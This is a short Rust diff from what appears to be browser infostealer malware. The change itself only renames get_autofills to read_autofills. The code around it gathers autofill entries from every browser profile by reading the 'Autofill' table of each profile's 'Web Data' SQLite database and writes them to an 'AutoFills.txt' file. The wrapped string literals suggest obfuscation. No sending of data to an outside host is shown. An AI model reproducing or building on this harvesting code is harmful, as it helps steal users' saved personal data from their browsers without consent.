@@ -29,7 +29,7 @@ impl Task for AutoFillTask {
     parent_name!("AutoFills.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut autofills) = collect_from_all_profiles(&self.browser.profiles, get_autofills) else {
+        let Some(mut autofills) = collect_from_all_profiles(&self.browser.profiles, read_autofills) else {
             return
         };
 
@@ -40,7 +40,7 @@ impl Task for AutoFillTask {
     }
 }
 
-fn get_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
+fn read_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
     let web_data_path = profile / s!("Web Data");
     read_sqlite3_and_map_records(&web_data_path, s!("Autofill"), extract_autofill_from_record)
 }
